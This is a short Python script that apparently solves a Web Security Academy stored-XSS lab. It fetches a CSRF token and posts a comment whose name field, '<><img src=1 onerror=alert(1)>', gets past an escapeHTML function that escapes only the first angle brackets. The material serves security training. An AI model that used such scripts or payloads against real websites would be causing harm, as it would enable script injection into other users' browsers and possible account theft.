import requests
from urllib.parse import urljoin
from requests.cookies import RequestsCookieJar
from typing import Tuple, Text, Union
import bs4
from bs4 import BeautifulSoup

"""
We control comment.author
and there is
```
let newInnerHtml = firstPElement.innerHTML + escapeHTML(comment.author)
```
with weak escaping
```
function escapeHTML(html) {
    return html.replace('<', '&lt;').replace('>', '&gt;');
}
```
replace only replaces the first occurrence of a char
"""

def scrape_csrf(url: Union[Text, bytes]) -> Tuple[str, RequestsCookieJar]:
    get_response = requests.get(url)
    html = get_response.content.decode('utf-8')
    soup = BeautifulSoup(html, 'html5lib')
    csrf_input = soup.find('input', {'name': 'csrf'})
    csrf_token = csrf_input['value']
    return csrf_token, get_response.cookies


base_url = 'https://ac231fe21e036b3fc1f000d0009d00a6.web-security-academy.net'
token, cookies = scrape_csrf(urljoin(base_url, '/post?postId=2'))
data = {
  'csrf': token,
  'postId': '2',
  'comment': 'asdf',
  'name': '<><img src=1 onerror=alert(1)>',
  'email': 'asdf@asdf.invalid',
  'website': 'https://asdf.invalid'
}



response = requests.post(urljoin(base_url, '/post/comment'), cookies=cookies, data=data)
print(response.content.decode('utf-8'))

